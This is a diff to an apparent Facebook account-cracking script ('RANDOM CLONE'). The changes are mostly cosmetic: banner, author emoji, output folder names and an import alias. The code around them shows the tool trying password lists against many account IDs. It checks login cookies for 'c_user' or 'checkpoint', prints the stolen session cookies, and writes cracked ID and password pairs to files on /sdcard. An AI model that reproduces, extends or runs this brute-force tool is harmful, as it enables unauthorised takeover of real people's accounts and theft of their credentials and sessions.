@@ -8,7 +8,7 @@
 import os,sys,time,json,random,re,string,platform,base64,uuid
 from bs4 import BeautifulSoup as sop
 from bs4 import BeautifulSoup
-import requests
+import requests as ress
 from datetime import date
 from datetime import datetime
 from time import sleep
@@ -83,17 +83,17 @@ def __init__(self):
         self.loop = 0
         
 logo = ("""\033[1;37m
- ╔═╦═╗╔══╗╔═╦╗╔╗╔╗╔══╗─╔╗
- ║║║║║╚║║╝║║║║║╚╝║║╔╗║─║║
- ║║║║║╔║║╗║║║║║╔╗║║╠╣║╔╣║
- ╚╩═╩╝╚══╝╚╩═╝╚╝╚╝╚╝╚╝╚═╝
+╔═╦═╗╔══╗╔═╦╗╔╗╔╗╔══╗─╔╗
+║║║║║╚║║╝║║║║║╚╝║║╔╗║─║║
+║║║║║╔║║╗║║║║║╔╗║║╠╣║╔╣║
+╚╩═╩╝╚══╝╚╩═╝╚╝╚╝╚╝╚╝╚═╝
 
 ==================================================
-[] AUTHOR    : MINHAJ 🔥
+[] AUTHOR    : MINHAJ 😈
 [] TOOLS     : RANDOM CLONE
 [] TYPE      : FREE
 [] FACEBOOK  : Minhaj Hossain
-[] WHATSAPP  : +880171513490-
+[] WHATSAPP  : +8801715134907
 ==================================================""")
 
 logo1 = ("""\033[1;37m
@@ -151,8 +151,8 @@ def fuck():
             yaari.submit(mumit2,uid,pwx,tl)
     print('==================================================')
     print(' [🤨] Crack process has been completed')
-    print(' [√] OK Ids saved in box/OK.txt')
-    print(' [¢] CP Ids saved in box/CP.txt')
+    print(' [√] OK Ids saved in mkings/OK.txt')
+    print(' [¢] CP Ids saved in mkings/CP.txt')
     print('==================================================')
 def mumit2(uid,pwx,tl):
     global loop
@@ -200,15 +200,15 @@ def mumit2(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print(f"\033[1;92m[mkings-OK] {uid}|{ps} \nCookie : {coki}")
-                open('/sdcard/mkings/OK.txt', 'a').write( uid+' | '+ps+'\n')
+                print(f"\033[1;92m[skings-OK] {uid}|{ps} \nCookie : {coki}")
+                open('/sdcard/skings/OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
-                print(f"\033[1;94m[skings-CP] {cid}|{ps}")
-                open('/sdcard/skings-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                print(f"\033[1;94m[mkings-CP] {cid}|{ps}")
+                open('/sdcard/mkings-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
